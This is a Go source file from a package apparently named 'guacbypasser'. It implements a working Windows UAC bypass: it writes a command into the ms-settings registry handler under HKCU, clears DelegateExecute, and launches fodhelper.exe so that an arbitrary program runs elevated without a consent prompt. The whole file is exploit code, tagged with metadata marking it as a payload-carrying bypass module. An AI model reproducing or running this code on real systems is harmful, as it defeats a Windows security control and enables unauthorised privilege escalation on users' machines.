package guacbypasser

import (
	"fmt"
	"os/exec"
	"path/filepath"
	"time"

	"golang.org/x/sys/windows/registry"
)

func tFodhelper(path string) error {
	_ = Reporter{
		Name: "fodhelper",
		Desc: "Bypass UAC using fodhelper and registry key manipulation",
		Id:   3,

		Type:   "Once",
		Module: "tFodhelper",

		Fixed:   false,
		FixedIn: "",

		Admin:   false,
		Payload: true,
	}

	// Get ABSOLUTE program path
	// +0x9ff ...
	fullPath, err := filepath.Abs(path)
	if err != nil {
		return err
	}

	// Cmd command with arguments
	cmd := fmt.Sprintf("%s /k start %s", `C:\Windows\System32\cmd.exe`, fullPath)
	if _, _, err = registry.CreateKey(
		registry.CURRENT_USER, `Software\Classes\ms-settings\shell\open\command`,
		registry.SET_VALUE); err != nil {

		return err
	}

	// Open key in `Software\Classes\ms-settings\shell\open\command`
	wk32, err := registry.OpenKey(
		registry.CURRENT_USER, `Software\Classes\ms-settings\shell\open\command`,
		registry.QUERY_VALUE|registry.SET_VALUE,
	)
	defer wk32.Close()
	if err != nil {
		return err
	}

	// Set DEFAULT value to cmd
	if err := wk32.SetStringValue("", cmd); err != nil {
		return err
	}

	// Set DelegateExecute to ""
	if err := wk32.SetStringValue("DelegateExecute", ""); err != nil {
		return err
	}
	time.Sleep(3 * 1 * time.Second)

	// Execute fodhelper.exe
	if _, err := exec.Command("cmd", "/C", "C:\\Windows\\System32\\fodhelper.exe").Output(); err != nil {
		return err
	}
	return nil
}
